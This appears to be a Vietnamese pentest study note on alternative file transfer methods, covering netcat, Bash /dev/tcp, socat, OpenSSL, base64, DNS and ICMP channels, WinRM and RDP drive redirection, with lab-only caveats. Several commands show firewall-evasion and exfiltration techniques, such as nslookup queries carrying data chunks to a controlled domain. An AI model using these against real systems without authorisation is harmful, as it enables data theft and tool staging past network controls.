---
layout: post
title: "Miscellaneous File Transfer Methods"
render_with_liquid: false
categories:
  - File Transfer
tags:
  - file-transfer
  - miscellaneous
source_collection: manual
---
Topics: File Transfer, Miscellaneous

## Overview

Ghi chú nhanh các phương pháp truyền file phụ trợ khi các cách phổ biến như HTTP, SMB, FTP, SCP, hoặc PowerShell không phù hợp trong môi trường lab hoặc hệ thống được phép kiểm thử.

Các phương pháp trong bài này tập trung vào những lựa chọn thay thế: Netcat/Ncat, `/dev/tcp`, PowerShell Remoting/WinRM, RDP clipboard, và RDP drive redirection. Những kỹ thuật này hữu ích khi một hướng kết nối bị firewall chặn, khi không có web server, hoặc khi đang có sẵn session quản trị từ xa.

Trước khi chọn phương pháp, cần xác định:

- OS và tool có sẵn trên target
- Hướng truyền file: download, upload, hay copy nội bộ
- Network egress/ingress có bị firewall hoặc proxy chặn không
- File là text hay binary
- Có cần chia nhỏ, encode, compress, hoặc verify hash không

## Netcat

`netcat` (`nc`) là công cụ đọc/ghi dữ liệu qua TCP hoặc UDP. Có nhiều biến thể Netcat, nên option có thể khác nhau giữa các hệ thống. `ncat` là bản hiện đại từ Nmap, hỗ trợ thêm SSL, IPv6, proxy SOCKS/HTTP, connection brokering và các option rõ hơn như `--send-only`, `--recv-only`.

### Receiver Listens

Cho máy nhận lắng nghe rồi ghi dữ liệu ra file.

Original Netcat trên máy nhận:

```bash
nc -l -p 8000 > file.bin
```

Ncat trên máy nhận:

```bash
ncat -l -p 8000 --recv-only > file.bin
```

Original Netcat trên máy gửi:

```bash
nc -q 0 <receiver-ip> 8000 < file.bin
```

Ncat trên máy gửi:

```bash
ncat --send-only <receiver-ip> 8000 < file.bin
```

`-q 0` yêu cầu một số bản Netcat đóng kết nối ngay sau khi stdin kết thúc. Với Ncat, `--send-only` và `--recv-only` rõ nghĩa hơn và giúp biết khi nào transfer hoàn tất.

### Sender Listens

Nếu firewall chặn inbound vào target nhưng target có thể outbound tới máy của mình, đảo chiều kết nối: máy gửi lắng nghe, máy nhận kết nối ra ngoài để lấy file.

Original Netcat trên máy gửi:

```bash
nc -l -p 443 -q 0 < file.bin
```

Máy nhận kết nối tới máy gửi:

```bash
nc <sender-ip> 443 > file.bin
```

Ncat trên máy gửi:

```bash
ncat -l -p 443 --send-only < file.bin
```

Ncat trên máy nhận:

```bash
ncat <sender-ip> 443 --recv-only > file.bin
```

Netcat đơn giản và linh hoạt, nhưng không có mã hóa, không có authentication và dễ bị firewall chặn.

## Bash /dev/tcp Transfer

Nếu target Linux không có Netcat/Ncat nhưng Bash hỗ trợ `/dev/tcp`, có thể nhận file bằng cách đọc trực tiếp từ TCP socket.

Trên máy gửi:

```bash
nc -l -p 443 -q 0 < file.bin
```

Hoặc với Ncat:

```bash
ncat -l -p 443 --send-only < file.bin
```

Trên target nhận file:

```bash
cat < /dev/tcp/<sender-ip>/443 > file.bin
```

Tính năng `/dev/tcp` phụ thuộc vào Bash và cách Bash được build. Nếu shell là `sh`, `dash`, hoặc restricted shell, kỹ thuật này có thể không dùng được.

## Socat

Trên máy nhận:

```bash
socat TCP-LISTEN:9001,fork FILE:file.bin,create
```

Trên máy gửi:

```bash
socat FILE:file.bin TCP:<receiver-ip>:9001
```

`socat` linh hoạt hơn netcat, hỗ trợ nhiều transport và option hơn.

## OpenSSL Encrypted Transfer

Tạo listener TLS trên máy nhận:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=transfer"
openssl s_server -quiet -accept 9001 -cert cert.pem -key key.pem > file.bin
```

Gửi file:

```bash
openssl s_client -quiet -connect <receiver-ip>:9001 < file.bin
```

Phù hợp khi cần mã hóa kênh truyền trong lab nhưng không có SSH/SCP.

## Base64 Clipboard Transfer

Encode file thành một dòng:

```bash
base64 -w 0 file.bin > file.b64
```

Decode:

```bash
echo "<base64-data>" | base64 -d > file.bin
```

Trên Windows PowerShell:

```powershell
[IO.File]::WriteAllBytes("C:\Windows\Temp\file.bin", [Convert]::FromBase64String("<base64-data>"))
```

Base64 phù hợp cho file nhỏ hoặc shell chỉ copy/paste được text.

## Split Large Files

Chia file lớn thành nhiều phần:

```bash
split -b 5M file.bin part_
```

Ghép lại:

```bash
cat part_* > file.bin
```

Trên Windows PowerShell, có thể dùng byte array để ghép file nhưng nếu có thể thì nên ưu tiên `certutil`, `copy /b`, hoặc tool transfer ổn định hơn.

## Compress Before Transfer

Linux:

```bash
tar -czf files.tar.gz folder/
```

Giải nén:

```bash
tar -xzf files.tar.gz
```

Windows PowerShell:

```powershell
Compress-Archive -Path .\folder -DestinationPath .\files.zip
Expand-Archive -Path .\files.zip -DestinationPath .\out
```

Nén giúp giảm kích thước và giữ cấu trúc thư mục.

## DNS Transfer

DNS có thể dùng làm kênh truyền dữ liệu text nhỏ khi HTTP/HTTPS bị chặn nhưng DNS vẫn đi ra ngoài. Ý tưởng là encode dữ liệu thành Base64/Base32 rồi gửi qua subdomain.

Ví dụ gửi từng chunk bằng `nslookup`:

```cmd
nslookup <chunk>.<id>.<domain-controlled-by-you>
```

Phương pháp này chậm, dễ lỗi với file lớn và nên chỉ dùng trong lab có domain/authoritative DNS bạn kiểm soát.

## ICMP Transfer

Một số môi trường cho phép ICMP. Có thể encode dữ liệu và gửi qua payload ICMP bằng tool chuyên dụng hoặc script nội bộ.

Kiểm tra ICMP cơ bản:

```bash
ping -c 4 <receiver-ip>
```

ICMP transfer không phải lựa chọn mặc định vì dễ bị network monitoring phát hiện và thường cần tool riêng ở cả hai đầu.

## QR Code Transfer

Với file text nhỏ, có thể encode thành QR để chuyển qua màn hình hoặc môi trường không có network trực tiếp.

Encode:

```bash
base64 -w 0 file.txt | qrencode -o file.png
```

Phương pháp này hữu ích cho dữ liệu rất nhỏ như token lab, nhưng không phù hợp cho binary lớn.

## Copy Through Shared Terminal

Khi chỉ có terminal/log console:

```bash
base64 -w 0 file.bin
```

Sau đó paste sang máy nhận và decode. Nếu dữ liệu dài, chia chunk trước để tránh giới hạn terminal, command length, hoặc web shell.

## PowerShell Session File Transfer

Khi HTTP/HTTPS/SMB không khả dụng nhưng có PowerShell Remoting, có thể dùng WinRM để copy file qua session PowerShell. WinRM thường dùng:

- TCP/5985 cho HTTP
- TCP/5986 cho HTTPS

Điều kiện thường gặp:

- PowerShell Remoting đã bật trên remote host
- User có quyền administrator, thuộc nhóm `Remote Management Users`, hoặc được cấp quyền trong session configuration
- Network cho phép kết nối tới WinRM port

Kiểm tra kết nối WinRM:

```powershell
Test-NetConnection -ComputerName <remote-host> -Port 5985
```

Tạo session:

```powershell
$Session = New-PSSession -ComputerName <remote-host>
```

Copy file từ máy local sang remote session:

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy file từ remote session về local:

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\remote.txt" -Destination C:\ -FromSession $Session
```

Nếu cần credential riêng:

```powershell
$Cred = Get-Credential
$Session = New-PSSession -ComputerName <remote-host> -Credential $Cred
```

## RDP File Transfer

RDP có thể truyền file bằng clipboard copy/paste hoặc mount local drive vào session remote.

### Clipboard Copy/Paste

Nếu clipboard redirection được bật, có thể copy file từ máy local và paste vào desktop/thư mục trong RDP session. Cách này tiện nhưng phụ thuộc policy, client RDP, và đôi khi không ổn định với file lớn.

### Mount Local Folder From Linux

Với `rdesktop`:

```bash
rdesktop <target-ip> -d <domain> -u <user> -p '<password>' -r disk:linux='/home/user/rdesktop/files'
```

Với `xfreerdp`:

```bash
xfreerdp /v:<target-ip> /d:<domain> /u:<user> /p:'<password>' /drive:linux,/home/user/filetransfer
```

Trong phiên Windows remote, truy cập folder đã mount qua:

```cmd
\\tsclient\
```

Sau đó copy file giữa `\\tsclient\linux` và filesystem của remote host.

### Mount Local Drive From Windows MSTSC

Với `mstsc.exe`, vào phần Local Resources rồi chọn ổ đĩa/thư mục muốn redirect trước khi kết nối. Sau khi vào phiên remote, drive được redirect sẽ xuất hiện dưới `\\tsclient\`.

Lưu ý:

- Drive redirect chỉ có trong session RDP của user đó; user khác trên target không tự động truy cập được.
- Windows Defender hoặc AV trên target có thể scan/xóa file trong redirected drive nếu file bị đánh dấu độc hại.
- Trong môi trường enterprise, clipboard/drive redirection có thể bị Group Policy chặn.

## Verify File Integrity

Linux:

```bash
sha256sum file.bin
md5sum file.bin
```

Windows PowerShell:

```powershell
Get-FileHash C:\Windows\Temp\file.bin -Algorithm SHA256
```

Hash hai bên nên giống nhau trước khi chạy file hoặc dùng dữ liệu đã transfer.

## Notes

- Ưu tiên phương pháp đơn giản nhất phù hợp với network path hiện có.
- Với file binary, luôn verify hash sau khi transfer.
- Với kênh không ổn định, nén và chia nhỏ file trước khi gửi.
- Các kênh như DNS/ICMP chỉ nên dùng trong lab hoặc phạm vi được phép rõ ràng.
- Với RDP/WinRM, kiểm tra quyền, policy, và port trước khi debug lệnh transfer.
